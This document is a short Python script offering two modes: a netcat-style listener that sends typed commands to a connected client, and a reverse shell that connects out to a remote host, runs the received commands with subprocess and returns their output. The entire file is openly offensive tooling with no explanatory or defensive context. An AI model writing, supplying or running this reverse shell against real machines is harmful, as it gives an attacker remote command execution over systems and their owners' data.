import socket,subprocess,sys,argparse

def netcat(port):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("",port))
        sock.listen(5)
        fd,addr = sock.accept()
        print(addr,fd.recv(1024).decode())
        while True:
            command = str(input("# "))
            fd.sendall(bytes(command,"utf-8"))
            sys.stdout.write(fd.recv(1024).decode())
            if command == "exit":
                sys.exit()


def reverseshell(rhost,port): 
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
        sock.connect((rhost,port))
        sock.sendall(bytes("connection!!","utf-8"))
        while True:
            try:
                command = sock.recv(1024).decode()
                if command == "exit":
                   sys.exit()
                command_request = subprocess.check_output(command.split())
                sock.sendall(command_request)
            except subprocess.CalledProcessError as e:
                sock.sendall(bytes(e,"utf-8"))
            except IndexError as e:
                sock.sendall(bytes(e,"utf-8"))


def main():

    try:
        arg = argparse.ArgumentParser()

        arg.add_argument("-port",type=int,help="")
        arg.add_argument("-type",type=str,help="")
        arg.add_argument("-rhost",type=str,help="")

        parse = arg.parse_args()

        if parse.type == "nc":
            netcat(parse.port)
        elif parse.type == "rs":
            reverseshell(parse.rhost,parse.port)

    except TypeError:
        start_up = subprocess.call(["python3",sys.argv[0],"-h"])
    except EOFError:
        sys.exit()
    except ConnectionRefusedError:
        sys.exit()
    except KeyboardInterrupt:
        sys.stdout.write("\n[-] Stop_Shell\n")
        sys.exit()

def main_tester():
    pass
    #netcat()
    #reverseshell()

if __name__ == "__main__":
    main()       
    #main_tester()
            
